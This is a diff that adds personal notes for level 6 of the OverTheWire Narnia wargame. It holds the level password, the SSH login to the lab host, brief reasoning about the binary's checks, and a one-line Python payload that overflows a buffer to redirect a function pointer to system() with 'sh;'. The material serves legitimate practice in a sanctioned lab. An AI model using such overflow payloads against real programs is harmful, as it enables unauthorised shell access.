@@ -1,0 +1,7 @@
+neezocaeng
+ssh narnia6@narnia.labs.overthewire.org -p 2226
+[the program loads 2 buffers, does some checking and calls a function fp with one of the buffers]
+[one of the checks makes sure that the function is not on the stack, therefor it must be an existing function]
+[system() is a good choice, because it just executes the string parameter on the shell]
+[the second buffer is not really necessary]
+./narnia6 "" $(python -c 'print 8*"A"+"sh;AAAAA\x50\xc8\xe4\xf7"')
